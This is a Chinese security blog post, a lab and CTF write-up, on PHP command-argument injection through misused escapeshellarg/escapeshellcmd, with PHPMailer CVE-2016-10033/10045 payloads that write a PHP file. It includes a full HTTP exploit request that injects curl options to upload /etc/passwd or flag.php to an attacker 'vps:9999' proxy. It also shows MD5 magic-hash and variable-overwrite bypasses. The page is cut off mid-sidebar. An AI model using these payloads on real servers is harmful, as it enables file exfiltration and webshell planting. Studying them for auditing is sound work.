@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="PHP-Audit-Labs靶场地址：https://www.ripstech.com/php-security-calendar-2017/ 查看最为主要的mail函数，该处曾有过命令执行漏洞 1234567bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_he">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP-Audit-Labs — Day5 scapeshellarg与escapeshellcmd使用不当">
+<meta property="og:url" content="https://wh0ale.github.io/2019/08/18/PHP-Audit-Labs-Day5-scapeshellarg与escapeshellcmd使用不当/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="PHP-Audit-Labs靶场地址：https://www.ripstech.com/php-security-calendar-2017/ 查看最为主要的mail函数，该处曾有过命令执行漏洞 1234567bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_he">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/carbon.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180731092527-9b242c62-9460-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-18_16-41-15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-18_16-43-34.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-18_17-42-20.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113825-29d337f6-a298-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113825-29eb896e-a298-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113826-2a222230-a298-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113826-2a5207ca-a298-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113826-2a719b8a-a298-1.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.276Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP-Audit-Labs — Day5 scapeshellarg与escapeshellcmd使用不当">
+<meta name="twitter:description" content="PHP-Audit-Labs靶场地址：https://www.ripstech.com/php-security-calendar-2017/ 查看最为主要的mail函数，该处曾有过命令执行漏洞 1234567bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_he">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/carbon.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/08/18/PHP-Audit-Labs-Day5-scapeshellarg与escapeshellcmd使用不当/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>PHP-Audit-Labs — Day5 scapeshellarg与escapeshellcmd使用不当 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/08/18/PHP-Audit-Labs-Day5-scapeshellarg与escapeshellcmd使用不当/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">PHP-Audit-Labs — Day5 scapeshellarg与escapeshellcmd使用不当
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-18 18:52:54" itemprop="dateCreated datePublished" datetime="2019-08-18T18:52:54+08:00">2019-08-18</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">5.2k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="PHP-Audit-Labs"><a href="#PHP-Audit-Labs" class="headerlink" title="PHP-Audit-Labs"></a>PHP-Audit-Labs</h1><p>靶场地址：<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a><br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/carbon.png" alt></p>
+<p>查看最为主要的<strong>mail函数</strong>，该处曾有过命令执行漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">    string $to ,</span><br><span class="line">    string $subject ,</span><br><span class="line">    string $message [,</span><br><span class="line">    string $additional_headers [,</span><br><span class="line">    string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>其参数含义分别表示如下：</p>
+<blockquote>
+<p>to，指定邮件接收者，即接收人<br>subject，邮件的标题<br>message，邮件的正文内容<br>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC<br>additional_parameters，指定传递给发送程序sendmail的额外参数。</p>
+</blockquote>
+<p>在Linux系统上， php 的 mail 函数在底层中已经写好了，默认调用 Linux 的 <strong>sendmail</strong> 程序发送邮件。而在额外参数( additional_parameters )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p>
+<blockquote>
+<p>-O option = value<br>QueueDirectory = queuedir 选择队列消息<br>-X logfile<br>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。<br>-f from email<br>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
+</blockquote>
+<p>此题而外添加了两处函数进行过滤<br><strong>filter_var() 函数的定义：</strong></p>
+<blockquote>
+<p>filter_var ：使用特定的过滤器过滤一个变量</p>
+<p>mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )<br>功能 ：这里主要是根据第二个参数filter过滤一些想要过滤的东西。</p>
+</blockquote>
+<p>关于 filter_var() 中 FILTER_VALIDATE_EMAIL 这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： none of the special characters in this local part are allowed outside quotation marks ，表示所有的特殊符号必须放在双引号中。 filter_var() 问题在于，我们在<strong>双引号中嵌套转义空格仍然能够通过检测</strong>。同时由于底层正则表达式的原因，我们通过<strong>重叠单引号和双引号</strong>，欺骗 filter_val() 使其认为我们仍然在双引号中，这样我们就可以绕过检测。下面举个简单的例子，方便理解：<br>传入 <a href="mailto:isnoallow@example.com" target="_blank" rel="noopener">isnoallow@example.com</a><br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180731092527-9b242c62-9460-1.png" alt><br>此前<a href="https://medium.com/@Wh0ale/php-audit-labs-day2-7940dd07a177" target="_blank" rel="noopener">PHP-Audit-Labs — Day2 filter_var()函数缺陷</a>，讲述了存在xss伪协议绕过构成xss漏洞还有ssrf漏洞</p>
+<p><strong>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</strong></p>
+<blockquote>
+<p>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)</p>
+<p>定义 ：string escapeshellarg ( string $arg )</p>
+</blockquote>
+<p>逃逸实例；<br>传入的参数是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&apos; -v -d a=1</span><br></pre></td></tr></table></figure>
+
+<p>由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;127.0.0.1&apos;\&apos;&apos; -v -d a=1&apos;</span><br></pre></td></tr></table></figure>
+
+<p>接着 escapeshellcmd 函数对第二步处理后字符串中的 \ 以及 a=1&#39; 中的单引号进行转义处理，结果如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;127.0.0.1&apos;\\&apos;&apos; -v -d a=1\&apos;</span><br></pre></td></tr></table></figure>
+
+<p>由于第三步处理之后的payload中的 \ 被解释成了 \ 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-18_16-41-15.png" alt><br>所以这个payload可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code>，即向 127.0.0.1\ 发起请求，POST 数据为 a=1&#39; 。</p>
+<p>总结一下，这题实际上是考察绕过 filter_var() 函数的邮件名检测，通过 mail 函数底层实现中调用的 escapeshellcmd() 函数处理字符串，再结合 escapeshellarg() 函数，最终实现参数逃逸，导致 远程代码执行</p>
+<h1 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h1><p>主要是通过了<code>CVE-2016-10033</code> <code>CVE-2016-10045</code>两个漏洞介绍了phpmail命令执行漏洞。与<code>CVE-2016-10033</code>不同的是<code>CVE-2016-10045</code>只添加了一个<code>&#39;</code>从而绕过了 <code>escapeshellcmd</code> 和 <code>escapeshellarg</code> 的函数防护处理</p>
+<p>CVE-2016-10033 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>
+
+<p>CVE-2016-10045 payloadl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复建议</strong></p>
+<p>我们来看一下 PHPMailer 官方给出的修复代码。官方对用户传入的参数进行检测，如果当中存在被转义的字符，则不传递 -f 参数（-f 参数表示发邮件的人，如果不传递该参数，我们的payload就不会被带入 mail 函数，也就不会造成命令执行），所以不建议大家同时使用 escapeshellcmd() 和 escapeshellarg() 函数对参数进行过滤，具体修复代码如下：<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-18_16-43-34.png" alt></p>
+<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p><strong>考点一：preg_match 过滤掉flag关键词</strong><br>但是同时在10-17行存在着<strong>可变变量</strong>，<br>首先 第10行 ，循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $<strong>R 。在 第11行 中先判断 $$</strong>R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。<br>使用<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-18_17-42-20.png" alt></p>
+<p>其中<code>$$R</code>是<code>$[&#39;_GET&#39;]、$[&#39;_POST&#39;]、$[&#39;_COOKIE&#39;]</code><br>我通过 GET 请求向 index.php 提交 flag=test ，接着通过 POST 请求提交 _GET[flag]=test 。当开始遍历 $_POST 超全局数组的时候， $<strong>k 代表 _GET[flag] ，所以 $$</strong>k 就是 $_GET[flag] ，即 test 值，此时 $$<strong>k == $</strong>v 成立，变量 $_GET[flag] 就被 unset 了。但是在 第21行 和 22行 有这样一串代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure>
+
+<p>extract 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， EXTR_SKIP 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 POST 请求提交 _GET[flag]=test ，所以这里会变成 $_GET[flag]=test ，这里的 $_GET 变量就不需要再经过 waf 函数检测了，也就绕过了 preg_match(&#39;/flag/i&#39;,$key) 的限制。</p>
+<p><strong>考点二：MD5函数漏洞</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;hongri&apos;]))</span><br></pre></td></tr></table></figure>
+
+<p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。<br>以下值在md5加密后以0E开头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+<p>以下值在sha1加密后以0E开头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sha1(‘aaroZmOk’)</span><br><span class="line">sha1(‘aaK1STfY’)</span><br><span class="line">sha1(‘aaO8zKZF’)</span><br><span class="line">sha1(‘aa3OFF9m’)</span><br></pre></td></tr></table></figure>
+
+<p>GET传入a=QNKCDZO&amp;b=240610708就能绕过</p>
+<p><strong>考点三：escapeshellarg() 和 escapeshellcmd() 函数冲突</strong><br><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号<br><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;|*?~&lt;&gt;^()[]{}$, x0A 和 xFF, &#39; 和 &quot;仅在不配对的时候被转义。<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113825-29d337f6-a298-1.png" alt></p>
+<p>在字符串增加了引号同时会进行转义，那么之前的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>因为增加了 <code>&#39;</code> 进行了转义，所以整个字符串会被当成参数。注意 <code>escapeshellcmd</code> 的问题是在于如果 &#39; 和 &quot; 仅在不配对儿的时候被转义。那么如果我们多增加一个 &#39; 就可以扰乱之前的转义了。如下：<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113825-29eb896e-a298-1.png" alt><br>在 <strong>curl</strong> 中存在 <code>-F</code> 提交表单的方法，也可以提交文件。 <code>-F &lt;key=value&gt;</code> 向服务器POST表单，例如： <code>curl -F &quot;web=@index.html;type=text/html&quot; url.com</code> 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。那么最后的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&apos; -F file=@/etc/passwd -x  vps:9999</span><br></pre></td></tr></table></figure>
+
+<p>这里应该是和 curl 版本有关系，我在 7.54.0 下没有测试成功。<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113826-2a222230-a298-1.png" alt></p>
+<p>题目中的 curl 版本是 7.19.7<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113826-2a5207ca-a298-1.png" alt></p>
+<p>根据猜测，可能在是新版本中，先会执行 curl http 的操作，但是由于在后面增加了,例如 <a href="http://127.0.0.1，" target="_blank" rel="noopener">http://127.0.0.1，</a> 但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180818113826-2a719b8a-a298-1.png" alt></p>
+<p>解答payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?flag=QNKCDZO&amp;hongri=s878926199a&amp;url=http://baidu.com/&apos; -F file=@/var/www/html/flag.php -x  vps:9999 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">_GET[flag]=QNKCDZO&amp;_GET[hongri]=s878926199a&amp;_GET[url]=http://baidu.com/&apos; -F file=@/var/www/html/flag.php -x  vps:9999</span><br></pre></td></tr></table></figure>
+
+<p>转载：<br><a href="https://xz.aliyun.com/t/2597" target="_blank" rel="noopener">https://xz.aliyun.com/t/2597</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/08/18/PHP-Audit-Labs-Day5-scapeshellarg与escapeshellcmd使用不当/" title="PHP-Audit-Labs — Day5 scapeshellarg与escapeshellcmd使用不当">https://wh0ale.github.io/2019/08/18/PHP-Audit-Labs-Day5-scapeshellarg与escapeshellcmd使用不当/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i># 代码审计</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/08/17/openEMR-SQL注入漏洞分析/" rel="next" title="OpenEMR SQL注入漏洞分析">
+                <i class="fa fa-chevron-left"></i> OpenEMR SQL注入漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/08/18/PHP-Audit-Labs-Day6-正则使用不当导致的路径穿越/" rel="prev" title="PHP-Audit-Labs-Day6-正则使用不当导致的路径穿越">
+                PHP-Audit-Labs-Day6-正则使用不当导致的路径穿越 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
